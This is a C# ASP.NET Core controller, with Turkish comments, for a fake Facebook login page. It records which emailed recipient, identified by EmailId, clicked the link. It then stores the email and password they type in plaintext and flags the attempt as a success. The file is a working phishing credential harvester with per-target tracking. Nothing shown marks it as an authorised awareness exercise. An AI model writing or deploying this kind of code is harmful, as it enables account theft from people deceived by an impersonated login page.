
 using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using WebApplicationProject.Models;


namespace WebApplicationProject.Controllers
 {
     public class FacebookLoginController : Controller
     {
         private readonly WebDatabaseContext _context;
         private readonly ILogger<FacebookLoginController> _logger;

         public FacebookLoginController(WebDatabaseContext context, ILogger<FacebookLoginController> logger)
         {
             _context = context;
             _logger = logger;
         }
         public IActionResult Page()
         {
             return View("~/Views/FacebookLogin/FacebookLogin.cshtml");
         }
         public IActionResult Index(int EmailId)
         {
             ViewBag.EmailId = EmailId;


            var existingClickedMail = _context.ClickedMails.FirstOrDefault(a => a.EmailId == EmailId);
            if (existingClickedMail == null) // Eğer böyle bir kayıt yoksa ekleme işlemi yap
            {
                var clicked = new ClickedMail
                {
                    EmailId = EmailId,
                    Date = DateTime.Now,
                    Success = false
                };
                _context.Add(clicked);
                _context.SaveChanges();
            }

            return View("~/Views/FacebookLogin/FacebookLogin.cshtml");
         }

         [HttpPost]
         [ValidateAntiForgeryToken]
         public async Task<IActionResult> PostLogin(string Email, string Password,int EmailId)
         {
             if (!string.IsNullOrEmpty(Email) && !string.IsNullOrEmpty(Password))
             {
                 // Veritabanına ekleme işlemi
                 var FacebookLogin = new FacebookLogin
                 {
                     Email = Email, 
                     Password = Password 
                 };
                 var clickedMail = _context.ClickedMails.FirstOrDefault(a => a.EmailId == EmailId);//Burda EmailId sini alıyorum 
                 clickedMail.Success = true;//giriş yap butonuna basıp giriş yaptığı için ClickedMail tablosunda False olan değeri Trueya çeviriyorum
                 _context.Add(FacebookLogin);//sonra bunu FacebookLogin tabloma ekliyorum
                 await _context.SaveChangesAsync();//bütün herşeyi save ediyorum
                 _context.Update(clickedMail);//save ettikten sonra değiştiriyorum ki ikinci defa aynı değeri tekrar veritabanına eklemeye çalışmasın 
                return View("Index");
             }

         return BadRequest(); // Hata durumunda bad request dönebilirsiniz
         }

     }
 }

